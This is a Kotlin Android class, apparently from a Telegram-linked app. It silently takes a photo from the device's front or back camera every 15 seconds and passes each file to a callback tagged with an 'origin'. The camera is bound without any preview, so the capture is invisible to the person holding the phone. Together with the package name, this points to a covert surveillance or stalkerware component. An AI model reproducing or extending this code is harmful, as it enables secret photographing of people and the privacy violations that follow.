package com.kashem.shaikh.telegram

import android.content.Context
import android.util.Log
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleOwner
import kotlinx.coroutines.*
import java.io.File
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class FrontCameraManager(
    private val context: Context,
    private val lifecycleOwner: LifecycleOwner,
    private val onPhotoCaptured: (File, String) -> Unit  // 🆕 অরিজিন প্যারামিটার
) {
    private var cameraProvider: ProcessCameraProvider? = null
    private var imageCapture: ImageCapture? = null
    private var isCapturing = false
    private var captureJob: Job? = null
    private var currentOrigin: String = "user"  // 🆕
    private val cameraExecutor: ExecutorService = Executors.newSingleThreadExecutor()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    fun startFrontCamera(origin: String = "user") {
        if (isCapturing) {
            Log.d("FrontCameraManager", "Already capturing")
            return
        }
        currentOrigin = origin
        startCameraInternal(true)
    }

    fun startBackCamera(origin: String = "user") {
        if (isCapturing) {
            Log.d("FrontCameraManager", "Already capturing")
            return
        }
        currentOrigin = origin
        startCameraInternal(false)
    }

    fun stopCamera() {
        isCapturing = false
        captureJob?.cancel()
        cameraProvider?.unbindAll()
        cameraProvider = null
        imageCapture = null
        Log.d("FrontCameraManager", "Camera stopped")
    }

    private fun startCameraInternal(isFront: Boolean) {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(context)
        cameraProviderFuture.addListener({
            cameraProvider = cameraProviderFuture.get()
            bindCameraUseCases(isFront)
        }, ContextCompat.getMainExecutor(context))
    }

    private fun bindCameraUseCases(isFront: Boolean) {
        val provider = cameraProvider ?: return

        val lensFacing = if (isFront) CameraSelector.LENS_FACING_FRONT else CameraSelector.LENS_FACING_BACK
        val cameraSelector = CameraSelector.Builder()
            .requireLensFacing(lensFacing)
            .build()

        imageCapture = ImageCapture.Builder()
            .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
            .build()

        try {
            provider.unbindAll()
            provider.bindToLifecycle(
                lifecycleOwner,
                cameraSelector,
                imageCapture
            )
            isCapturing = true
            startPeriodicCapture()
        } catch (exc: Exception) {
            Log.e("FrontCameraManager", "Use case binding failed", exc)
        }
    }

    private fun startPeriodicCapture() {
        captureJob?.cancel()
        captureJob = scope.launch {
            while (isCapturing) {
                captureImage()
                delay(15000)
            }
        }
    }

    private fun captureImage() {
        val capture = imageCapture ?: return
        val photoFile = File(context.cacheDir, "camera_${System.currentTimeMillis()}.jpg")

        val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()

        capture.takePicture(
            outputOptions,
            ContextCompat.getMainExecutor(context),
            object : ImageCapture.OnImageSavedCallback {
                override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                    Log.d("FrontCameraManager", "Photo saved: ${photoFile.absolutePath}")
                    onPhotoCaptured(photoFile, currentOrigin)  // অরিজিন পাস
                }

                override fun onError(exc: ImageCaptureException) {
                    Log.e("FrontCameraManager", "Photo capture failed", exc)
                }
            }
        )
    }
}